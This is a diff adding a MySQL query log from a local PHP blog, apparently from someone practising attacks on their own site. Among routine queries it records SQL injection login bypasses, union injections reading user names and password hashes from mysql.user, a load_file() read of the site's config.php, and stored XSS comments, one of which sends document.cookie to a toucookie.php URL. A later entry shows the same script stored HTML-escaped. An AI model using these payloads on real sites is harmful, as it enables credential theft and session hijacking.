@@ -1,0 +1,757 @@
+-----------------------------------------
+2016/01/26 10:02:25
+select * from user where name='123' and password='123'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:02:33
+select * from user where name='admin' and password='123'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:02:41
+select * from user where name='test' and password='123456'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:02:56
+select * from user where name='admin' and password='123456'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:02:56
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:05:51
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:05
+select * from user where name='admin' and password='123456'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:05
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:07
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:12
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:25
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:25
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:06:25
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:07:48
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:07:57
+select * from user where name='admin' and password='123456'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:07:57
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:08:40
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:09:01
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 10:09:54
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:13:14
+select * from user where name='sdfd' or 1 #' and password='asdfsadf'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:13:14
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:14:55
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:14:55
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:14:55
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:14:56
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:14:56
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:15:00
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22222
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:15:00
+select * from comment where art_id=22222
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:06
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22222 union select 1,2,3,4,5,6,7 from user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:06
+select * from comment where art_id=22222 union select 1,2,3,4,5,6,7 from user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:06
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:06
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:06
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:36
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:36
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:36
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:43
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:43
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:43
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:44
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:44
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:48
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:16:48
+select * from comment where art_id=222222
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:17:04
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select 1,2,3,4,5,6 from user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:17:04
+select * from comment where art_id=222222 union select 1,2,3,4,5,6 from user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:17:54
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,user.User,3,user.Password,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:17:54
+select * from comment where art_id=222222 union select user.Host,user.User,3,user.Password,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:10
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,user.User,3,user.Password,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:10
+select * from comment where art_id=222222 union select user.Host,user.User,3,user.Password,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:14
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select 1,2,3,4,5,6 from user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:14
+select * from comment where art_id=222222 union select 1,2,3,4,5,6 from user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:15
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select 1,2,3,4,5,6 from user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:15
+select * from comment where art_id=222222 union select 1,2,3,4,5,6 from user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:28
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select 1,user.Host,3,4,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:18:28
+select * from comment where art_id=222222 union select 1,user.Host,3,4,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:19:08
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,user.User,3,4,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:19:08
+select * from comment where art_id=222222 union select user.Host,user.User,3,4,5,6 from user
+Unknown column 'user.Host' in 'field list'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:20:11
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,user.User,3,4,5,6 from mysql.user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:20:11
+select * from comment where art_id=222222 union select user.Host,user.User,3,4,5,6 from mysql.user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:20:27
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,user.User,user.Password,4,5,6 from mysql.user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:20:27
+select * from comment where art_id=222222 union select user.Host,user.User,user.Password,4,5,6 from mysql.user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:20:46
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,user.User,user.Password,user.Password,5,6 from mysql.user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:20:46
+select * from comment where art_id=222222 union select user.Host,user.User,user.Password,user.Password,5,6 from mysql.user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:22:40
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=222222 union select user.Host,load_file('C:/wamp/www/1224/1224blog/lib/config.php'),user.Password,user.Password,5,6 from mysql.user
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:22:40
+select * from comment where art_id=222222 union select user.Host,load_file('C:/wamp/www/1224/1224blog/lib/config.php'),user.Password,user.Password,5,6 from mysql.user
+The used SELECT statements have a different number of columns
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:28:56
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:29:11
+select * from user where name='asdf\' or 1#' and password='asdfsadf'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:51:28
+select * from user where name='admin'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:52:51
+select * from user where name='admin'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:52:58
+select * from user where name='admin'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:52:58
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:53:39
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 14:53:59
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:31:44
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:32:00
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:32:22
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:33:00
+select * from user where name='admin'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:33:00
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:36:31
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:36:31
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:36:31
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:36:33
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:36:33
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:17
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:17
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:17
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','</div>
+<p style=\"font-size:100px;\">逗你玩</p>','1453793837','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:17
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:17
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:17
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:32
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:32
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:32
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','','1453793852','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:32
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:32
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:32
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:59
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:59
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:59
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','<script>
+alert(\'1111\');
+</script>','1453793879','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:59
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:59
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:37:59
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:38:32
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:38:32
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:38:32
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','<script>while(true){alert(\'aaaaa\');}</script>','1453793912','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:38:32
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:38:33
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:38:33
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:08
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:27
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:33
+select * from user where name='admin'
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:33
+select art_id,title,pubtime,comm,catname from art left join cat on art.cat_id=cat.cat_id
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:37
+select cat_id,catname from cat
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:37
+select count(*) from art where 1
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:37
+select art_id,title,content,pubtime,comm,catname,thumb from art inner 
+join cat on art.cat_id=cat.cat_id where 1 order by art_id desc limit 0,2
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:40
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:40:40
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:03
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:03
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:03
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','<script>alert(document.cookies;)</script>','1453794063','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:03
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:03
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:03
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:10
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:10
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:45
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:45
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:45
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','<script>alert(document.cookie)</script>','1453794105','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:45
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:45
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:41:45
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:43:36
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:43:36
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:43:36
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','<script>
+var url = \"http://localhost//toucookie.php?cookie=\" + document.cookie;
+var img = document.createElement(\"img\");
+img.src = url;
+document.appendChild(url);
+</script>','1453794216','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:43:36
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:43:36
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:43:36
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:45:47
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:45:47
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:46:02
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:46:02
+select * from comment where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:46:02
+insert into comment (nick,email,content,pubtime,art_id,ip) values ('asdf','asdf','&lt;script&gt;
+var url = \&quot;http://localhost//toucookie.php?cookie=\&quot; + document.cookie;
+var img = document.createElement(\&quot;img\&quot;);
+img.src = url;
+document.appendChild(url);
+&lt;/script&gt;','1453794362','22','2130706433')
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:46:02
+update art set comm=comm+1 where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:46:02
+select title,content,pubtime,catname,comm,pic from art inner join cat on art.cat_id=cat.cat_id where art_id=22
+-----------------------------------------
+
+-----------------------------------------
+2016/01/26 15:46:02
+select * from comment where art_id=22
+-----------------------------------------
+
